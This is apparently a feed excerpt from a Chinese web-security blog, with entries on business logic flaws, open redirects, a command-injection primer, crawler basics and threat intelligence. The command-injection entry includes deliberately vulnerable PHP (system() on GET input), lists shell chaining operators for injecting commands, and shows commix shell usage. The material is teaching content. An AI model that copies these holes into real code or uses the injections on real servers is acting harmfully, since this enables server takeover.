        <content type="html"><![CDATA[<p>逻辑漏洞博大精深，人犯的错各种各样。我们前期要做的就是总结常见的逻辑错误，后期挖逻辑漏洞挖多了，每个环节应该怎样做才能更安全，我们也就知道了。当然，最重要的还是要理解业务的逻辑，一步步理清它。</p><h1 id="建议的学习方法">建议的学习方法</h1><ol type="1"><li><p>学习并掌握常见的数据重放工具，如: Burpsuite</p></li><li><p>学习并熟悉常见的业务场景。</p></li><li><p>尽可能掌握业务逻辑安全的不同攻击形式。</p></li></ol><h1 id="定义">定义</h1><p>业务逻辑漏洞是指由于程序逻辑不严谨或逻辑太复杂，导致一些逻辑分支不能正常处理或处理错误。</p><p>通俗地讲：一个系统的功能过多，伴随着业务模块、组件的交互与共享，程序开发人员就难以思考全面，对某些地方可能有遗漏或者未能正常处理，从而导致逻辑漏洞。逻辑漏洞也可以说是程序开发人员的思路错误、程序开发人员的逻辑存在漏洞。</p><h1 id="特点">特点</h1><p>业务逻辑漏洞是非常隐蔽的，它不像 SQL 注入、XSS跨站脚本攻击、命令执行、文件上传漏洞等有鲜明的标识。自动化扫描器可以定义一系列的规则识别出这些漏洞，而业务逻辑漏洞一般出现在功能（业务流程）上，这是漏洞扫描工具无法识别的。</p><p>业务逻辑漏洞出现于业务流程中（模块功能），也就是说，网站的任何部分都有可能存在着逻辑错误漏洞。比如，修改个人资料就完全可能出现逻辑错误漏洞。</p><p>大致分类：用户模块、交易支付模块</p><p>用户模块：</p><p>1）密码注册、找回、修改、重置，邮箱绑定</p><p>2）头像上传等资料的修改</p><p>可能存在的漏洞：任意账户注册、任意密码重置、找回、任意邮箱绑定、CSRF修改可以 Self XSS 的资料、越权访问、修改，当然，也可能涉及 XSS，SQLinjection，文件上传等其他漏洞。</p><p>注：重置邮箱或者使用邮箱找回密码时，如果发到邮箱的是链接且一些参数没有使用太复杂的加密，八成存在漏洞。</p><p>交易支付模块：</p><p>1）选择商品，下单，付款</p><p>2）优惠券</p><p>可能存在的漏洞：商品数目支付漏洞（正负数目抵消）、优惠券型支付漏洞（可以伪造优惠券）、金额修改支付漏洞</p><p>业务模块大致分为：用户模块、交易支付模块，<strong>可以采用以下攻击流程对每个模块逐一测试。</strong>（每个模块，过一遍下面的流程，因为如果你要把所有模块再过一遍，数据报比较多，比较乱，不容易分析。）</p><h1 id="测试流程">测试流程</h1><ol type="1"><li><p>正常操作并记录数据包</p><p>按照正常操作流程，记录其数据包</p></li><li><p>分析数据包</p><p>分析数据包，找到数据宝忠的敏感部分</p></li><li><p>分析程序验证机制</p><p>分析猜测程序后台所采用的验证机制、手段</p></li><li><p>修改源数据包</p><p>修改源数据包，验证推测是否成功</p></li></ol><h1 id="常见挖掘姿势">常见挖掘姿势</h1><p>黑客在挖掘业务逻辑漏洞时的一般操作步骤如下：</p><p>1）发现网站所提供的功能模块。比如，修改密码、找回密码、修改个人资料等功能。2）针对具体的功能确定业务流程，详细划分具体步骤，以购物为例介绍，购物流程如下：</p><blockquote><p>挑选商品，商品可多选；立刻购买，在“立刻购买”按钮旁边可以选择购买数量、购买样式等；显示购买信息，在此步骤可以给卖家留言，填写购买数量、使用优惠券、匿名购买、找人付款；提交订单； 付款。</p></blockquote><p>3）拦截 HTTP/HTTPS 请求，分析其参数项的含义；4）修改参数值，尝试触发业务逻辑漏洞；5）返回前面步骤，对其他功能继续测试。</p><p>密码重置</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/login_vuln/pass_reset.png" /></p><p>支付交易</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/login_vuln/order_proc.png" /></p><h1 id="授权验证绕过">授权验证绕过</h1><p>检测手段</p><ul><li>授权访问</li><li>未授权访问</li></ul><h2 id="未授权访问">未授权访问</h2><p>非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。尝试将一些敏感的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。</p><h2 id="越权访问">越权访问</h2><ol type="1"><li>垂直越权（垂直越权是指使用权限低的用户可以访问权限较高的用户）</li><li>水平越权（水平越权是指相同权限的不同用户可以互相访问）</li></ol><h1 id="密码找回">密码找回</h1><p>1）密码找回的凭证（验证码）太弱，如只需要填入一个四位或者六位的纯数字就可以重置密码，导致可以暴力破解。2）密码找回凭证可从客户端直接获取。3）密码找回凭证在页面中可以直接获取。4）用户找回密码的邮箱地址或者手机号码被修改。5）在最后提交修改的密码处的逻辑错误。</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> logic_vuln </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>URL 重定向总结</title>
      <link href="/blog/2019/10/05/websec/url_redirect/"/>
      <url>/blog/2019/10/05/websec/url_redirect/</url>
      
        <content type="html"><![CDATA[<h1 id="url-跳转原理">URL 跳转原理</h1><ol type="1"><li>应用越来越多的需要与第三方应用交互</li><li>在自身应用内部根据不同的逻辑将用户引向不同的页面</li></ol><p>譬如：一个典型的登录接口就经常需要在登录成功之后将用户引导到登陆之前的页面，整个过程中如果处理不好，就可能导致一些安全问题，特定条件下可能引起严重的安全漏洞。</p><h1 id="类型">类型</h1><p>两种类型的跳转对用户来说是透明的，都是指向或跳转到另一个页面，页面发生了变化。</p><h2 id="客户端跳转重定向">客户端跳转（重定向）</h2><p>客户端替换也被称为 URL 重定向，用户浏览器的地址栏 URL会有明显的变化。</p><p>比如：当前页面为 http://www.test.com.xk.php ，当点击 “登录“按钮后会指向 http:test.com/login/php页面发生变化，这就是客户端跳转。</p><h2 id="服务端跳转请求转发">服务端跳转（请求转发）</h2><p>服务端也称为 URL 转发，服务端跳转时，用户浏览的地址栏不会变化的。</p><p>比如：当前页面 URL 为 http://www.test.com/xk.php, 当点击 “登录”按钮后， 浏览器地址栏的 URL 没变。但是页面会发生变化。</p><p>还有一些跳转不属于转发，也不属于重定向，而是直接向服务器发送请求，这就是点击劫持了。比如：下面a 标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.test.com/xk.jsp&quot;&gt;安全测试&lt;/a&gt;</span><br></pre></td></tr></table></figure><h1 id="攻击方式及危害">攻击方式及危害</h1><p>后台服务器在告知浏览器跳转时，未对客户端传入的重定向地址进行合法的校验导致了用户浏览器跳转到钓鱼页面的一种漏洞。</p><p>恶意用户完全可以借用 URL跳转来欺骗安全意识较低的用户，从而导致“中奖”之类的欺诈，这对于一些有在线业务的企业如：淘宝，亚马逊等，危害较大。</p><p>同时借助 URL 跳转，也可以突破常见的基于“白名单方式”的一些安全限制，如传统 IM 里对于 URL的传播会进行安全校验，但是对于大公司的域名及 URL将直接允许通过并且显示为可信的 URL，而一旦 URL里包含一些跳转漏洞将可能导致安全限制被绕过。</p><p>如果允许引用一些资源的限制是依赖于 “白名单方式”，同样可能被绕过导致安全风险</p><p>譬如：常见的一些应用允许引入可信站点如：baidu.com的视频，限制方式往往是检查 URL 是否是 baidu.com 来实现，如果 baidu.com内含一个 URL跳转漏洞，将导致最终引入的资源属于不可信的第三方资源或者恶意站点，最终导致安全问题。</p><h1 id="钓鱼攻击">钓鱼攻击</h1><p>模拟网页或者软件，几乎与官方的软件完全相同，连域名也非常相似。</p><p>防护措施：比如：黑名单策略，对一些链接进行危险标识</p><p>URL跳转对自身没有危害，但是这个漏洞可以成为黑客进行其他恶意行为的助手或跳板。</p><h1 id="绕过-url-限制">绕过 URL 限制</h1><p><ahref="https://y-hkl.github.io/2018/01/11/URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/">URL跳转漏洞</a></p><p>常见的：正/反斜杠，双反斜杠。@，#，白名单缺陷</p><p>URL 批量：</p><p>常见关键字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect、go、return、returnTo、redirect、returnurl</span><br></pre></td></tr></table></figure><p>常出现的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login, register, logout ,</span><br><span class="line">changesite language, links in emails</span><br></pre></td></tr></table></figure><h1 id="漏洞组合">漏洞组合</h1><p>URL 漏洞与其他漏洞组合</p><p><ahref="https://blkstone.github.io/2017/12/25/bug-hunter-tutorial-zseano/">zseano漏洞赏金猎人系列教程开放 URL 重定向</a></p><p><strong>跳转的地方很容易有 XSS，比如：使用 window.location.href跳转的时候</strong></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>命令执行入门篇</title>
      <link href="/blog/2019/10/05/websec/cmd_execution/cmd_exec/"/>
      <url>/blog/2019/10/05/websec/cmd_execution/cmd_exec/</url>
      
        <content type="html"><![CDATA[<h1 id="建议的学习方法">建议的学习方法</h1><ol type="1"><li><p>学习并灵活掌握常见的编程语言，如 PHP、JAVA 等。</p></li><li><p>熟悉并可灵活运用常见的程序框架，如 Strut 2、ThinkPHP等。</p></li><li><p>手工和工具结合运用，可对程序源代码进行针对性审计。</p></li></ol><p>很多人喜欢把代码执行称为命令执行漏洞，因为命令执行和代码执行都可以执行系统命令。</p><p>区别：</p><p>命令执行漏洞直接执行操作系统的命令；</p><p>代码执行漏洞是靠脚本代码调用系统命令，然后执行。</p><h1 id="常见攻击流程">常见攻击流程</h1><ol type="1"><li><p>前期准备</p><p>下载程序源码，并部署测试环境</p></li><li><p>代码审计</p><ul><li>结合手工和工具对程序源代码进行白盒审计</li><li>利用常见黑盒技术手段对当前环境进行检测</li></ul></li><li><p>攻击利用</p><p>针对第二阶段发现的问题进行分析和利用</p></li></ol><h1 id="定义及原理">定义及原理</h1><h2 id="定义">定义</h2><p>命令执行漏洞，就是指用户通过浏览器或其他辅助程序提交执行命令，由于服务器端有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。</p><p>通俗地讲：当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如php 中的 system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常的命令中，造成命令执行攻击。</p><h2 id="原理">原理</h2><p>命令执行漏洞之所以会产生，原因就是由于开发人员编写源码，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中WEB 服务器没有过滤类似 system()，eval()，exec()等函数是该漏洞攻击成功的最主要原因。</p><h1 id="危害">危害</h1><ol type="1"><li>继承 Web 服务程序的权限去执行系统命令或读写文件</li><li>反弹 Shell</li><li>控制整个网站甚至控制服务器</li><li>进一步内网渗透</li><li>挂马、钓鱼、敏感信息泄露</li></ol><h1 id="分类">分类</h1><ul><li><p>框架组件层：</p><p>很典型的就是 WordPress 中，可以选择使用 ImageMagick这个常用的图片处理组件，对用户上传的图片进行处理，造成命令执行；JAVA中的命令执行漏（struts2/Elasticsearch 等）；ThinkPHP 命令执行</p></li><li><p>代码层：一些商业应用需要执行命令，商业应用的一些核心代码可能封装在二进制文件中，在web 应用中通过 system等函数来调用。当用户可以控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p></li><li><p>系统层：</p><p>（bash 破壳漏洞）如果我们能够控制执行的 bash的环境变量，就可以通过破壳漏洞来执行任意代码；</p></li></ul><p>利用条件</p><ol type="1"><li>应用调用执行系统命令的函数</li><li>将用户输入作为系统命令的参数拼接到命令行中</li><li>没有对用户输入进行过滤或过滤不严</li></ol><h1 id="框架组件层">框架组件层</h1><p><ahref="http://blog.topsec.com.cn/apache-structs2-s2-032%e6%8a%80%e6%9c%af%e5%88%86%e6%9e%90%e5%8f%8a%e6%bc%8f%e6%b4%9e%e6%a3%80%e6%b5%8b%e8%84%9a%e6%9c%ac/?utm_source=tuicool&amp;utm_medium=referral">ApacheStruts2 s2-032 技术分析及漏洞检测脚本</a> 自己去搭建环境，测试。</p><h1 id="代码层">代码层</h1><p>PHP 下命令执行函数</p><p>在 PHP 中具有执行系统命令功能的函数如下:</p><ol type="1"><li>system</li><li>exec</li><li>shell_exec</li><li>passthry</li><li>popen</li><li>proc_popen</li></ol><p>提示：某些情况下，要注意存在以上函数的 PHP 文件，有可能是Webshell</p><p>命令执行漏洞代码分析</p><p>以下给出一个存在命令执行漏洞的简单代码</p><p>参考链接：php.net --&gt;system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;cmd&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">system($_GET[&quot;cmd&quot;]);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="windows-下命令执行漏洞技巧">Windows 下命令执行漏洞技巧</h2><h3 id="命令执行代码分析">命令执行代码分析</h3><p>以下使用 PHP 代码，对指定目标执行 ping 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">$arg = $_GET[&quot;cmd&quot;];</span><br><span class="line">if($arg)&#123;</span><br><span class="line">system(&#x27;ping $arg&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="命令执行漏洞利用思路">命令执行漏洞利用思路</h3><p>代码中拼接用户的输入并通过 system函数执行，但是无法直接执行用户的自定义命令。</p><p>思路：</p><p>截断输入，重新拼接。两条命令都输入并执行</p><h3 id="命令执行漏洞拼接符">命令执行漏洞拼接符</h3><p>在 Windows 系统下的 cmd 命令中，有以下一些阶段拼接符</p><p><code>&amp;</code> ：前面的语句为假，则直接执行后面的 --&gt;</p><p><code>&amp;&amp;</code> ：前面的语句为假，则直接出错，后面的也不执行--&gt; 逻辑与</p><p><code>|</code>：直接执行后面的语句 --&gt;管道符，将前面命令的结果传给后面，然后执行后面命令</p><p><code>||</code>：前面出错执行后面的 --&gt; 逻辑或</p><p>使用拼接符，从而利用命令执行漏洞执行 ipconfig 命令</p><p>这四个命令拼接符有可能在不同的 Windows平台下，有些不一样，我们测试的时候，可以四种都试一试，找到可以利用的。</p><h2 id="linux-命令执行漏洞利用技巧">Linux 命令执行漏洞利用技巧</h2><h3 id="命令执行示例代码分析">命令执行示例代码分析</h3><p>以下使用 PHP 代码，对指定目标执行 ping 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;</span><br><span class="line">$arg = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if($arg)&#123;</span><br><span class="line">system(&quot;ping -c 4 $arg&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Linux 下的 ping 命令与 Windows 下的 ping 命令的区别：</p><p>Linux 的 ping 默认一直执行。需要加上 -c 4 指定执行参数为 4次，才会只执行 4 次</p><p>Windows 下的 ping 默认执行 4 次</p><p>kali linux 集成了 Apache2 和 Nginx</p><p>apache 的网站根目录为 <code>/var/www/html/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 status#查看 apache2 服务当前状态</span><br><span class="line">service apache2 start# 开启 apache2 服务</span><br></pre></td></tr></table></figure><h3 id="命令执行漏洞拼接符介绍">命令执行漏洞拼接符介绍</h3><p>在 Linux 系统下的 shell 命令中，有以下一些截断拼接符</p><p><code>;</code> ： 前面的执行完，执行后面的 --&gt; 分隔符</p><p><code>|</code> ：管道符，显示后面的执行结果</p><p><code>&amp;</code>: 无论前面语句真假都会执行</p><p><code>&amp;&amp;</code>: 只有前面语句为真，才会执行后面语句 ---&gt;逻辑与</p><p><code>||</code>： 当前面的执行错误时，执行后面的 --&gt; 逻辑或</p><p>在 Linux 上，上面的 <code>;</code> 也可以用 <code>|</code>，<code>||</code> 代替。</p><h1 id="代码执行漏洞">代码执行漏洞</h1><p>在 PHP 下允许命令执行的函数有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br><span class="line">assert()</span><br><span class="line">preg_replace()</span><br><span class="line">call_user_func()</span><br></pre></td></tr></table></figure><p>如果页面中存在这些函数并且对用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞。</p><p>其他函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ob_start()、unserialize()、create_function()</span><br><span class="line">usort()、uasort()、uksort()</span><br><span class="line">array—_filter()</span><br><span class="line">array_reduce()</span><br><span class="line">array_map()</span><br></pre></td></tr></table></figure><p>命令执行绕 WAF 技巧：</p><h1 id="命令执行自动化工具">命令执行自动化工具</h1><h2 id="commix-工具介绍">commix 工具介绍</h2><p>Commix 是一个使用 Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接导入Burp 的历史记录进行检测，大大提高了易用性。</p><p>commix github</p><p>kali linux 自带了 commix， 可以直接使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commix -h# 查看帮助信息</span><br><span class="line">commix -u ｛url｝# 即可检测，然后会提示你是否模拟 shell，直接模拟出来一个 shell</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> cmd_execution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>爬虫基础</title>
      <link href="/blog/2019/09/15/programming/python/spider_basic/"/>
      <url>/blog/2019/09/15/programming/python/spider_basic/</url>
      
        <content type="html"><![CDATA[<h2 id="http-常见请求头">HTTP 常见请求头</h2><ul><li><p>Host（主机和端口号）</p></li><li><p>Connection（链接类型）</p></li><li><p>Upgrade-Insecure-Requests（值为 1 ，则升级为 HTTPS请求）</p></li><li><p><strong>User-Agent（浏览器名称）</strong></p></li><li><p>Accept（传输文件类型）</p></li><li><p>Referer（页面跳转处）</p></li><li><p>Accept-Encoding（文件编解码格式）</p></li><li><p><strong>Cookie （Cookie）</strong></p></li><li><p>X-requested-with: XMLHttpRequest（是 Ajax 异步请求）</p></li><li><p>X-forward-for: ip0 ip1 ip2 表示 HTTP 请求端真实 IP 为ip0**</p></li><li><p>Remote Address: 最终请求服务器地址</p></li><li><p>Aceept：多种类型，每一种/几种类型后面的 q是权重的意思，权重大，优先级高</p></li></ul><p>requests 模块在 Python 2 和 Python 3 中都是一样的，因此不用担心。</p><h2 id="user-agent">User-Agent</h2><ol type="1"><li>可以在 chrome 的开发者工具中，更改为各种手机的UA。有时候电脑版的网页的一些地址、post 数据发向的 URL不好找或加密繁杂有时间戳等，可以切换到手机版看看，往往有惊喜哦。</li><li>可以通过切换 UA 来降低被识别为爬虫的几率</li></ol><h2 id="cookie-与-seesion">Cookie 与 Seesion</h2><p>cookie保存在浏览器本地，用户/本地可以修改其内容。因为它是保存在本地的，所以它的大小是有上限的</p><p>seesion也保存在服务器端，用户/本地无法更改其内容。因为它是保存在服务器上面的，所以它的大小取决于服务器大小。</p><h2 id="字符串区别与转化">字符串区别与转化</h2><p>Python 3 中字符串分为以下两种类型：str 类型和 bytes 类型</p><p>bytes 类型：<strong>二进制</strong></p><ul><li>互联网上的数据都是以二进制的方式来传输的</li></ul><p>str 类型：unicode 的呈现形式</p><p>编码方式解码方式必须一样，否则就会出现乱码</p><h2 id="字符编码简单回顾">字符编码简单回顾</h2><p><strong>Unicode UTF8 ASCII 的补充</strong> 字符集包括：ASCI字符集、GB2312 字符集、GB18030 字符集、Unicode 字符集等 ASCll 编码是 1个字节，而 Unicode 编码<strong>通常</strong>是 2 个字节。 UTF-8 是Unicode 的实现方式之一，UTF-8 是它是一种变长的编码方式，可以是 1，2，3个 字节</p><h1 id="爬虫的定义">爬虫的定义</h1><p>网络爬虫（又被称为网页蜘蛛，网络机器人）就是模拟客户端发送网络请求，接收请求响应，一种按照一定的规则，自动地抓取互联网信息的程序。<strong>只要是浏览器能做的事情，原则上，爬虫都能够做</strong></p><p>要爬取一个网站的数据，不一定要硬怼这个网站本身。我们可以换个渠道：</p><ol type="1"><li>改换 UA，手机版等</li><li>去与该网站有合作的网站，迂回操作</li></ol><h1 id="爬虫分类">爬虫分类</h1><ol type="1"><li>通用爬虫：通用爬虫是搜索引擎抓取系统（百度、谷歌、搜狗等）的重要组成部分。主要是将互联网上的网页下载到本地，形成一个互联网内容的镜像备份。</li><li>聚焦爬虫：是面向<strong>特定需求</strong>的一种网络爬虫程序，他与通用爬虫的区别在于：聚焦爬虫在实施网页抓取的时候会对内容进行筛选和处理，尽量保证只抓取与需求相关的网页信息。</li></ol><h1 id="通用搜索引擎的工作原理">通用搜索引擎的工作原理</h1><h2 id="搜索引擎的流程">搜索引擎的流程</h2><p>抓取网页 ----&gt; 数据存储 ----&gt; 预处理 ----&gt;提供检索服务、网站排名（点击率，引用次数等）</p><p>种子 URL 地址不一定是网上的所有 URL 地址，只要通过某个 URL的响应内容中的 URL 可以达到就行</p><p>搜索引擎排名算法：PageRank 算法</p><p>交换友链以及要求在文章或网站中放链接的目的：</p><p>为了增加网站或文章被引用的次数，当百度引擎获取一个网页内容时，也可以获取里面的URL，从而提高里面 URL的曝光率。而且如果文章等被权重大的网站引用，那么效果更好。</p><h3 id="robots-协议">robots 协议</h3><p>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</p><p>robots 协议也叫 robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的爬虫，此网站中的哪些内容是不应被搜索引擎的爬虫获取的，哪些是可以被爬虫获取的。</p><h1 id="聚焦爬虫">聚焦爬虫</h1><p>URL List ----&gt; 响应内容（根据响应内容提取 URL ，放入 URL List再次提取） ----&gt; 提取数据 ----&gt; 入库</p><p>在相应内容中提取 URL， 可以使用</p><ul><li><p>下一页处获取 URL，直到没有下一页</p></li><li><p>详情处提取 URL</p></li></ul><p>学习规划：</p><p>基础知识 ----&gt; requests 使用 ----&gt; 数据提取方法 ----&gt;动态网页提取数据 ----&gt; scrapy ----&gt; scrapy redis</p><p><strong>浏览器渲染出来的页面和爬虫请求的页面并不一样的。</strong></p><p>爬虫请求的只有 HTML，而浏览器会根据 html 中的js，图片等地址，请求图片，css 等，同时 js还会动态改变页面，最终渲染出页面。</p><p>Chrome 中的 Elements 与 Network 中的 Repsonse</p><p>network 中的 response 只是纯的 HTML，而 Elements 是包含 CSS, JS,图片以及当前 URL 地址的响应（response）的，而当前页面可能会通过 JS，Ajax 动态生成、改变网页内容。</p><p>我们在后续爬虫时，要以当前 URL 地址对应的响应 response为准，如果有一天我们根据当前 URL地址对应的响应，拿不到数据，那可能在其他 URL 的响应里面或者是通过 JS生成的。</p><p>爬虫的时候我们要确定 URL中的参数哪些是有用的，哪些是没用的，有用的参数会不会变，如果变，那其规律是什么</p><h2 id="user-agents-of-spiders">User-Agents of spiders</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Baidu spider</span><br><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br><span class="line"></span><br><span class="line">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>威胁情报</title>
      <link href="/blog/2019/09/13/misc/threat_intellig/"/>
      <url>/blog/2019/09/13/misc/threat_intellig/</url>
      
        <content type="html"><![CDATA[<h1 id="威胁情报现状与未来发展">威胁情报现状与未来发展</h1><ul><li><p><ahref="https://www.freebuf.com/news/137830.html">威胁情报的前世今生</a></p></li><li><p><ahref="https://finsec.pingan.com/Article/detail/803">《威胁情报技术应用及发展分析蓝皮书》——聚焦攻防，情报驱动，全面升级安全运营</a></p><p>本文看 威胁情报概述、威胁情报的历史及现状，威胁情报规模三个部分就行，后面没啥看的感觉。</p></li><li><p><ahref="https://zhuanlan.zhihu.com/p/29685186">威胁情报真的是网络安全的“少数派报告“么？</a></p><p>按阶段讲述了威胁情报的发展以及当前的现状。</p><p>节选</p></li></ul><blockquote><p>正因为威胁情报的潜力无限，所以信息安全行业真的很需要很多精通数据挖掘技术和机器学习技术的懂安全的工程师加入到这个行业中来，相信威胁情报的未来一片光明。</p><p>但是话虽这么说，一定要注意威胁情报只能用来辅助决策，不能用来直接决策，所以现在一般说威胁情报可以用来预测攻击的基本上都是xxx。与其他的技术相结合可以使威胁情报的作用最大化，诸如互联网攻击溯源、用户实体行为分析（UEBA）、事件调查与取证等技术结合威胁情报往往会产生意想不到的结果。</p></blockquote><ul><li><p><a href="https://www.freebuf.com/articles/system/98790.html">从RSA 热词看威胁情报在 NGFW 上的落地</a></p></li><li><p><ahref="https://www.sec-un.org/rsa2017全面解读-安全厂家之威胁情报/">RSA2017全面解读-安全厂家之威胁情报</a></p><p>本文讲解的当前局势和未来发展都挺好的</p></li></ul><blockquote><p>A next-generation firewall (NGFW) is a part of the third generationof firewall technology, combining a traditional firewall with othernetwork device filtering functionalities --wikipedia</p><p>下一代防火墙是第三代防火墙技术的一部分。它将传统的防火墙技术与其他具备过滤功能的网络设施结合起来。</p></blockquote><p>我查着从 RSA 2014 就有 threat intelligence 这个概念了，然后 RSA2015、2016、2017 逐渐火爆、成熟（2013 和 2018 没查 emm），2019威胁情报依旧是 RSA 讨论的一个热点。</p><p><a href="https://www.rsaconference.com/usa/2019">RSA 2019</a>想看哪一年，就把链接末尾的数字改一下就行了。</p><h1 id="威胁情报的分类">威胁情报的分类</h1><p>根据生成的情报的优先级分类：</p><p><ahref="https://xuj.me/threat_intelligence/sec-threat-intelli/#%E6%83%85%E6%8A%A5%E6%8C%89%E4%BC%98%E5%85%88%E7%BA%A7%E5%88%86%E7%B1%BB">情报的分类</a></p><p>根据情报的信息来源分类：</p><p><ahref="https://xuj.me/threat_intelligence/sec-threat-intelli/#%E5%AE%89%E5%85%A8%E6%83%85%E6%8A%A5%E5%88%86%E7%B1%BB">安全情报分类</a></p><h1 id="威胁情报流程">威胁情报流程</h1><p>威胁流程主要选自 <ahref="https://www.secpulse.com/archives/96022.html">安全小课堂第 128期【甲方威胁情报生存指南】</a></p><p>简单来说就是：<strong>源数据 –&gt; 自动化分析 –&gt;威胁情报</strong></p><p>附上一张来自安全牛的图</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/ti_process2.png" /></p><p>稍微再详细点：</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/ti_process.jpg" /></p><h2 id="信息收集">信息收集</h2><p>就是按照情报来源的分类去收集，而收集的方法：对于资产情报直接去收集就好。</p><p>对于其他的情报，主要依赖网络爬虫和公开的 API 进行收集</p><p>通过爬虫收集分为两种：</p><p>第一种是公开信息收集</p><p>即可以通过类似于 selenium+scrapy这种组合对特定页面的数据进行爬取落库操作</p><p>Google 开放服务里面提供一种服务叫做 Google CSE(CustomSearchEngine)，这个东西可以利用 Google的爬虫对特定的目标完成定制化的查找和排序，并且可以通过自带的 API将搜索结果保存成 JSON 格式，以便和其他的平台进行衔接。用户只需要对 CSE里面的规则进行编写即可完成这一部分的收集；</p><p>第二种是未公开信息收集</p><p>除了互联网之外，一些业务相关的安全信息更多的可能会出现在暗网，黑/灰产社群社区论坛等。</p><p>暗网的话可以使用 OnionProxy+OnionScan进行收集，此外有一些暗网搜索引擎也提供了 API，可以进行和搜集。</p><p>鉴于黑产交易的渠道多为 QQ 群和微信群以及Telegram，对于这一部分需要去使用聊天机器人对特定的几个黑产群的聊天记录进行爬取，github上有很多公开的机器人 code（注意法律法规问题）</p><p>第三种是基于 RSS、订阅的信息</p><p>这种的话由于格式很规范，解析后直接落库即可，不需要花费太多的精力，推荐使用rssparser 